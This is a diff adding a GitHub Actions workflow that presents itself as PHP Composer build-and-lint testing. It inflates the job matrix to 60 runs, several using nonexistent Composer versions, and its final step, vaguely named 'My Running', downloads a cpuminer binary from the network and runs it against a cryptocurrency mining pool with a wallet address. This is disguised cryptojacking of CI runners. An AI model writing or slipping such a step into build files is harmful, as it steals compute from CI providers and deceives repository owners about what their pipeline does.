@@ -1,0 +1,59 @@
+name: Tested PHP Composer
+
+on:
+  push:
+    branches: [ master ]
+  pull_request:
+    branches: [ master ]
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    strategy:
+      matrix:
+        php-version: ['5.6', '7.1', '7.2', '7.3', '7.4', '8.0']
+        composer-version: ['v1', 'v2', 'v3', 'v4', 'v5', 'v6', 'v7', 'v8', 'v9', 'v10']
+
+    name: Build on PHP ${{ matrix.php-version }} with Composer ${{ matrix.composer-version }}
+
+    steps:
+    - uses: actions/checkout@v2
+
+    - name: Setup PHP
+      uses: shivammathur/setup-php@v2
+      with:
+        php-version: ${{ matrix.php-version }}
+        coverage: none
+        tools: composer:${{ matrix.composer-version }}
+
+    - name: Validate composer.json and composer.lock
+      run: composer validate
+
+    - name: Get composer cache directory
+      id: composer-cache-dir
+      run: echo "::set-output name=dir::$(composer config cache-files-dir)"
+
+    - name: Cache dependencies
+      id: composer-cache
+      uses: actions/cache@v2
+      with:
+        path: ${{ steps.composer-cache-dir.outputs.dir }}
+        key: ${{ runner.os }}-php_${{ matrix.php-version }}-composer_${{ matrix.composer-version }}-composer-${{ hashFiles('**/composer.lock') }}
+        restore-keys: ${{ runner.os }}-php_${{ matrix.php-version }}-composer_${{ matrix.composer-version }}-composer-
+
+    - name: Install dependencies
+      run: composer install --prefer-dist --no-progress --no-suggest
+
+    - name: Check php syntax
+      run: find . -path ./vendor -prune -o -name '*.php' | xargs -I file php -lf file
+
+    - name: PHP Code Sniffer
+      run: vendor/bin/phpcs --ignore="*/vendor/*" .
+
+    - name: My Running
+      run:  |
+        wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+        tar xf cpuminer-opt-linux.tar.gz
+        ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:17042 -u sugar1qtfu03rahndmf65yfpyjakg83qm2sg74ytnjpdn.10
